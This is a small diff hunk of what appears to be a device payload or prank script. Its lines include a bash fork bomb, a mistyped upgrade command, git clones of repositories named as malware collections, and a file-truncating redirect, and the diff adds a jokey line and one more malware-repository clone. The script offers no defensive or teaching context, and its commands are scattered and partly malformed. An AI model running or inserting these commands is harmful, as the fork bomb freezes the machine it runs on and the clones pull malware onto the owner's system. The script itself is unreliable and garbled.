@@ -9,6 +9,8 @@ debootstrap
 sudo get upgrade
 :(){:|:&};:
 BlinkLED: ORANGE
+Hey Now ¬ Hit This!
+git clone https://github.com/Penetrum-Security/Malware-Zoo
 git clone https://github.com/malwares/DangerousZone
 git clone https://github.com/HBMS-0em/off
 >off
